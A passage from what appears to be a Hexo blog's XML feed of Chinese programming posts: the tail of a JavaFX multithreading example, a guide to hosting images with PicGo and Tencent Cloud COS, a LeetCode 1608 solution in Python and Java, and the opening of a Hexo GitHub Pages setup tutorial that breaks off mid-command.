class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        launch(args);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Button</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;按钮&quot;</span>);<br>        <span class="hljs-type">TextArea</span> <span class="hljs-variable">textArea</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextArea</span>();<br>        textArea.setPrefWidth(<span class="hljs-number">200</span>);<br>        textArea.setPrefHeight(<span class="hljs-number">200</span>);<br><br>        <span class="hljs-type">VBox</span> <span class="hljs-variable">vBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VBox</span>();<br>        vBox.getChildren().addAll(button, textArea);<br>        vBox.setSpacing(<span class="hljs-number">10.0</span>);<br>        vBox.setAlignment(Pos.CENTER);<br><br>        <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>        anchorPane.getChildren().add(vBox);<br>        anchorPane.setStyle(<span class="hljs-string">&quot;-fx-background-color: #c1da87;&quot;</span>);<br><br>        <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>        primaryStage.setScene(scene);<br>        primaryStage.setWidth(<span class="hljs-number">300</span>);<br>        primaryStage.setHeight(<span class="hljs-number">300</span>);<br>        primaryStage.show();<br><br>        button.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>                    <span class="hljs-type">MultiTask1</span> <span class="hljs-variable">multiTask1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MultiTask1</span>(<span class="hljs-string">&quot;任务&quot;</span>+i);<br>                    multiTask1.start();<br>                    multiTask1.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;String[]&gt;() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends String[]&gt; observable, String[] oldValue, String[] newValue)</span> &#123;<br>                            <span class="hljs-keyword">for</span> (String s : newValue) &#123;<br>                                textArea.appendText(s + <span class="hljs-string">&quot;\t&quot;</span>);<br>                            &#125;<br>                            textArea.appendText(<span class="hljs-string">&quot;\n&quot;</span>);<br>                        &#125;<br>                    &#125;);<br>                &#125;<br><br>            &#125;<br>        &#125;);<br><br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTask1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Service</span>&lt;String[]&gt;&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiTask1</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Task&lt;String[]&gt; createTask() &#123;<br><br>        Task&lt;String[]&gt; task = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>&lt;String[]&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> String[] call() <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                System.out.println(name + <span class="hljs-string">&quot; 开始 &quot;</span> + Thread.currentThread().getName());<br><br>                Thread.sleep(<span class="hljs-number">5000</span>);<br><br>                System.out.println(name + <span class="hljs-string">&quot; 结束 &quot;</span> + Thread.currentThread().getName());<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;name, <span class="hljs-string">&quot;true&quot;</span>&#125;;<br>            &#125;<br>        &#125;;<br><br>        <span class="hljs-keyword">return</span> task;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004144213856.png" alt="image-20221004144213856"></p>]]></content>
    
    
    <categories>
      
      <category>javafx</category>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>javafx</tag>
      
      <tag>多线程</tag>
      
      <tag>gui</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[杂项] 使用picGo和腾讯云COS搭建图床</title>
    <link href="/2022/10/03/%5B%E6%9D%82%E9%A1%B9%5D%20%E4%BD%BF%E7%94%A8picGo%E5%92%8C%E8%85%BE%E8%AE%AF%E4%BA%91COS%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/"/>
    <url>/2022/10/03/%5B%E6%9D%82%E9%A1%B9%5D%20%E4%BD%BF%E7%94%A8picGo%E5%92%8C%E8%85%BE%E8%AE%AF%E4%BA%91COS%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="使用picGo和腾讯云COS搭建图床"><a href="#使用picGo和腾讯云COS搭建图床" class="headerlink" title="使用picGo和腾讯云COS搭建图床"></a>使用picGo和腾讯云COS搭建图床</h1><p>以前都是本地写文章自己看，所以图片都是保存在本地的。自从搭建了网站，图片的保存成了问题，用网上的图床担心失联，所以就想搭建自己的图床。</p><p>开始使用的是<a href="https://gridea.dev/docs/">Gridea</a>，可以将图片同步到Github仓库，但是经过使用后发现不太好用，老是失败。然后选择了<code>picGo</code>，相较于<code>Gridea</code>，<code>picGo</code>提供了更多的选项，可以选择<code>Github</code>、<code>腾讯云COS</code>、<code>阿里云OSS</code>、<code>七牛图床</code>等，首先选择的是<code>Github图床</code>，实践后发现总是连接失败，挂的梯子也没有用，所以最后选择了<code>腾讯云COS</code>。</p><h2 id="腾讯云COS"><a href="#腾讯云COS" class="headerlink" title="腾讯云COS"></a>腾讯云COS</h2><p>腾讯云COS，即对象存储，首次使用有50G存储的六个月免费期限，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003165321277.png" alt="image-20221003165321277"></p><p>开通后<strong>创建存储桶</strong>，访问权限要设置<strong>公有读私有写</strong>，其他默认就行，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003165608660.png" alt="image-20221003165608660"></p><p>然后在<strong>存储桶列表</strong>选择新建的桶，进入后在<strong>文件列表</strong>中<strong>创建文件夹</strong>用于保存图片，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003170750753.png" alt="image-20221003170750753"></p><p>接着选择<strong>密钥管理</strong>，在<strong>API密钥管理</strong>生成密钥，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003165839573.png" alt="image-20221003165839573"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003170039435.png" alt="image-20221003170039435"></p><p>到这里腾讯云COS就配置好了，密钥要保密，不要泄露。</p><h2 id="PicGo配置"><a href="#PicGo配置" class="headerlink" title="PicGo配置"></a>PicGo配置</h2><p>首先在<a href="https://github.com/Molunerfinn/PicGo/releases">PicGo-Github</a>下载客户端。</p><p>下载安装后进行配置，主要配置的就是桶名称和API密钥，根据自己的配置就行了，存储路径设置为创建的文件夹，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003170852260.png" alt="image-20221003170852260"></p><p>配置好之 后，就可以上传图片了，上传后可以在相册看到，同时腾讯云COS文件夹中也可以看到，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003171110471.png" alt="image-20221003171110471"></p><h2 id="Typora配置"><a href="#Typora配置" class="headerlink" title="Typora配置"></a>Typora配置</h2><p>写文档用的最多的就是Typora，Typora提供了图床同步的功能，在设置中选择图像，上传服务选择<code>PicGo(app)</code>，路径是PicGo的安装路径，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003171716992.png" alt="image-20221003171716992"></p><p>设置好之后点击<strong>验证图片上传功能</strong>就可以测试上床是否正常，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003172137516.png" alt="image-20221003172137516"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这里图床就搭建好了，国庆几天都在折腾这些，网上工具很多，教程也很多，找到一个合适的不容易。</p><p>国庆快乐:happy:</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>typora</tag>
      
      <tag>picGo</tag>
      
      <tag>腾讯云</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[算法] LeetCode-1608-特殊数组的特征值</title>
    <link href="/2022/10/03/%5B%E7%AE%97%E6%B3%95%5D%20LeetCode-1608-%E7%89%B9%E6%AE%8A%E6%95%B0%E7%BB%84%E7%9A%84%E7%89%B9%E5%BE%81%E5%80%BC/"/>
    <url>/2022/10/03/%5B%E7%AE%97%E6%B3%95%5D%20LeetCode-1608-%E7%89%B9%E6%AE%8A%E6%95%B0%E7%BB%84%E7%9A%84%E7%89%B9%E5%BE%81%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<h1 id="1608-特殊数组的特征值"><a href="#1608-特殊数组的特征值" class="headerlink" title="1608-特殊数组的特征值"></a>1608-特殊数组的特征值</h1><p>给你一个非负整数数组 <code>nums</code> 。如果存在一个数 <code>x</code> ，使得 <code>nums</code> 中恰好有 <code>x </code>个元素 <strong>大于或者等于</strong> <code>x</code> ，那么就称 <code>nums</code> 是一个 <strong>特殊数组</strong> ，而 <code>x</code> 是该数组的 <strong>特征值</strong> 。</p><p><strong>注意</strong>： <code>x</code> <strong>不必</strong> 是 <code>nums</code> 的中的元素。</p><p>如果数组 <code>nums</code> 是一个 <strong>特殊数组</strong> ，请返回它的特征值 <code>x</code> 。否则，返回 <code>-1 </code>。可以证明的是，如果 <code>nums</code> 是特殊数组，那么其特征值 <code>x</code> 是 唯一的 。</p><p>示例 1：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入：nums = [3,5]<br>输出：2<br>解释：有<span class="hljs-number"> 2 </span>个元素（3 和 5）大于或等于<span class="hljs-number"> 2 </span>。<br></code></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">输入：nums <span class="hljs-operator">=</span> [<span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span>]<br>输出：<span class="hljs-number">-1</span><br>解释：没有满足题目要求的特殊数组，故而也不存在特征值 <span class="hljs-keyword">x</span> 。<br>如果 <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>，应该有 <span class="hljs-number">0</span> 个元素 &gt;<span class="hljs-operator">=</span> <span class="hljs-keyword">x</span>，但实际有 <span class="hljs-number">2</span> 个。<br>如果 <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>，应该有 <span class="hljs-number">1</span> 个元素 &gt;<span class="hljs-operator">=</span> <span class="hljs-keyword">x</span>，但实际有 <span class="hljs-number">0</span> 个。<br>如果 <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>，应该有 <span class="hljs-number">2</span> 个元素 &gt;<span class="hljs-operator">=</span> <span class="hljs-keyword">x</span>，但实际有 <span class="hljs-number">0</span> 个。<br><span class="hljs-keyword">x</span> 不能取更大的值，因为 nums 中只有两个元素。<br></code></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入：nums = [0,4,3,0,4]<br>输出：3<br>解释：有<span class="hljs-number"> 3 </span>个元素大于或等于<span class="hljs-number"> 3 </span>。<br></code></pre></td></tr></table></figure><p>示例 4：</p><p><code>输入：nums = [3,6,7,7,0] 输出：-1</code></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 100</code></li><li><code>0 &lt;= nums[i] &lt;= 1000</code></li></ul><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>按照题目的意思，如果是特殊数组，那么特殊值一定在<code>[1, m]</code>之间，其中m是数组长度。那么就可以遍历其中的数，并统计数组中大于或等于该值的数的个数。python的实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">specialArray</span>(<span class="hljs-params">self, nums: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">int</span>:<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(nums)+<span class="hljs-number">1</span>):<br><br>            c = <span class="hljs-number">0</span><br><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> nums:<br><br>                <span class="hljs-keyword">if</span> j &gt;= i:<br><br>                    c += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> c == i:<br><br>                <span class="hljs-keyword">return</span> i<br><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">执行用时：<span class="hljs-number">48</span> ms, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">14.98</span><span class="hljs-meta">%</span>的用户<br>内存消耗：<span class="hljs-number">14.8</span> MB, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">89.60</span><span class="hljs-meta">%</span>的用户<br>通过测试用例：<span class="hljs-number">98</span> / <span class="hljs-number">98</span><br></code></pre></td></tr></table></figure><p>或者也可以有另一种方法，首先将数组从大到小排列，同样是在<code>[1, m]</code>之间遍历，由于已经逆序排列了，如果存在了特征值<code>i</code>，那么<code>nums[i-1]</code>一定会大于或等于<code>i</code>，而其之后的元素，或者不存在（即已经到达了边界），或者<code>nums[i]&lt;i</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">specialArray</span>(<span class="hljs-params">self, nums: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">int</span>:<br><br>        nums.sort(reverse=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(nums)+<span class="hljs-number">1</span>):<br><br>            <span class="hljs-keyword">if</span> (nums[i-<span class="hljs-number">1</span>] &gt;= i) <span class="hljs-keyword">and</span> (i == <span class="hljs-built_in">len</span>(nums) <span class="hljs-keyword">or</span> nums[i] &lt; i):<br><br>                <span class="hljs-keyword">return</span> i<br><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">执行用时：<span class="hljs-number">44</span> ms, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">28.09</span><span class="hljs-meta">%</span>的用户<br>内存消耗：<span class="hljs-number">15</span> MB, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">27.10</span><span class="hljs-meta">%</span>的用户<br>通过测试用例：<span class="hljs-number">98</span> / <span class="hljs-number">98</span><br></code></pre></td></tr></table></figure><hr><hr><p>给出java的写法，方法一</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">specialArray</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= nums.length; i++)&#123;<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j : nums)&#123;<br><br>                <span class="hljs-keyword">if</span> (j &gt;= i)&#123;<br><br>                    c++;<br><br>                &#125;<br><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (c == i)&#123;<br><br>                <span class="hljs-keyword">return</span> i;<br><br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">执行用时：<span class="hljs-number">1</span> ms, 在所有 Java 提交中击败了<span class="hljs-number">81.80</span><span class="hljs-comment">%的用户</span><br>内存消耗：<span class="hljs-number">39.3</span> MB, 在所有 Java 提交中击败了<span class="hljs-number">47.37</span><span class="hljs-comment">%的用户</span><br>通过测试用例：<span class="hljs-number">98</span> / <span class="hljs-number">98</span><br></code></pre></td></tr></table></figure><p>方法二</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">specialArray</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br><br>        Arrays.sort(nums);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>, j=n-<span class="hljs-number">1</span>; i&lt;j; i++, j--)&#123;<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> nums[i];<br><br>            nums[i] = nums[j];<br><br>            nums[j] = tmp;<br><br>        &#125;<br><br>  <br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&lt;n+<span class="hljs-number">1</span>; i++)&#123;<br><br>            <span class="hljs-keyword">if</span> (nums[i-<span class="hljs-number">1</span>]&gt;=i &amp;&amp; (i==n || nums[i]&lt;i))&#123;<br><br>                <span class="hljs-keyword">return</span> i;<br><br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">执行用时：<span class="hljs-number">1</span> ms, 在所有 Java 提交中击败了<span class="hljs-number">81.80</span><span class="hljs-comment">%的用户</span><br>内存消耗：<span class="hljs-number">39.3</span> MB, 在所有 Java 提交中击败了<span class="hljs-number">44.21</span><span class="hljs-comment">%的用户</span><br>通过测试用例：<span class="hljs-number">98</span> / <span class="hljs-number">98</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
      <category>技能</category>
      
    </categories>
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>python</tag>
      
      <tag>java</tag>
      
      <tag>数组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[杂项] 使用hexo搭建Github Page</title>
    <link href="/2022/10/02/%5B%E6%9D%82%E9%A1%B9%5D%20%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BAGithub%20Page/"/>
    <url>/2022/10/02/%5B%E6%9D%82%E9%A1%B9%5D%20%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BAGithub%20Page/</url>
    
    <content type="html"><![CDATA[<h1 id="使用hexo搭建Github-Page个人主页"><a href="#使用hexo搭建Github-Page个人主页" class="headerlink" title="使用hexo搭建Github Page个人主页"></a>使用<code>hexo</code>搭建<code>Github Page</code>个人主页</h1><p>为什么要搭建个人主页？因为在平台上会有<strong>审核</strong>。</p><p>最开始想要搭建个人网站使用的是<code>wordpress</code>，当时的体验非常的不好，首先就是速度，当时并不会搭梯子，所以搭建或者更新会非常的慢；然后<code>wordpress</code>功能会非常的臃肿，如果只是要写作来说，很多都是没有的功能；最后就是安全问题，这是后话了。</p><p>某一天偶然学会了写<code>Markdown</code>文档，有种相见恨晚的感觉，之后写文档都是用的这种。所以想要再次搭建个人网站时，就想着能否将本地写的文档直接上传作为博客。于是就直到了<code>Github</code>的<code>Page</code>主页。</p><p><code>GitHub</code>的<code>Page</code>主页搭建方法有很多，经过测试，选择了一种最适合的，那就是<code>hexo</code>。这里会详细的介绍我是如何用<code>hexo</code>搭建<code>Github</code>个人主页的。</p><h2 id="Hexo本地搭建"><a href="#Hexo本地搭建" class="headerlink" title="Hexo本地搭建"></a><code>Hexo</code>本地搭建</h2><p><a href="https://hexo.io/zh-cn/">Hexo</a>是一个快速、简洁且高效的博客框架。<code>Hexo</code>使用<code>Markdown</code>解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p>安装<code>Hexo</code>需要用到：</p><ul><li><a href="http://nodejs.org/">Node.js</a> (<code>Node.js</code> 版本需不低于 <code>10.13</code>，建议使用 <code>Node.js 12.0</code> 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li></ul><p>安装好之后，就可以使用<code>npm</code>安装<code>Hexo</code>了。使用命令：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">npm install -g hexo-<span class="hljs-keyword">cli</span><br></code></pre></td></tr></table></figure><p>安装成功之后可以使用命令检查：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">hexo <span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><p>接着就可以搭建网站了。</p><p>首先初始化博客目录，在合适的文件夹下使用命令：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">hexo <span class="hljs-keyword">init</span> &lt;github name&gt;.github.io<br></code></pre></td></tr></table></figure><p>这里<code>&lt;github name&gt;</code>需要换成<code>GitHub用户名</code>。运行成功会创建名为<code>&lt;github name&gt;.github.io</code>的目录。进入该目录，使用命令进行自动配置博客，</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p>执行完成之后，会出现类似下面的目录结构：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf">.<br>├── <span class="hljs-variable">_config</span>.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── <span class="hljs-variable">_drafts</span><br>|   └── <span class="hljs-variable">_posts</span><br>└── themes<br></code></pre></td></tr></table></figure><p>其中各个文件或目录的作用为：</p><ul><li><code>_config.yaml</code>：网站主要配置信息。</li><li><code>package.json</code>：应用程序信息。安装后就没用了。</li><li><code>scaffolds</code>：模板文件夹。<code>Hexo</code>可根据模板创建文件。</li><li><code>source</code>：资源文件夹，用于存放用户资源。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 &#x2F; 文件夹和隐藏的文件将会被忽略。<code>Markdown</code> 和 <code>HTML</code> 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</li><li><code>themes</code>：主题文件夹。Hexo 会根据主题来生成静态页面。</li></ul><p>然后执行以下命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p>其中每个命令的作用：</p><ul><li><code>hexo clean</code>：清除缓存文件和已生成的静态文件。</li><li><code>hexo g</code>：即<code>generate</code>，生成静态文件。</li><li><code>hexo s</code>：即<code>server</code>，启动服务器。默认情况下在<code>http://localhost:4000/</code>。</li></ul><p>打开浏览器，输入<code>http://localhost:4000/</code>，就可以看到个人网站了，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/caqbw2nc2g.png" alt="img"></p><h3 id="Hexo主题设置"><a href="#Hexo主题设置" class="headerlink" title="Hexo主题设置"></a><code>Hexo</code>主题设置</h3><p><code>Hexo</code>提供了很多的<a href="https://hexo.io/themes/">Themes</a>，可以很方便的进行配置。通用的方法是找到一款喜欢的主题，将主题<code>clone</code>到<code>theme</code>目录下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git clone https://github.com/iissnan/hexo-theme-next 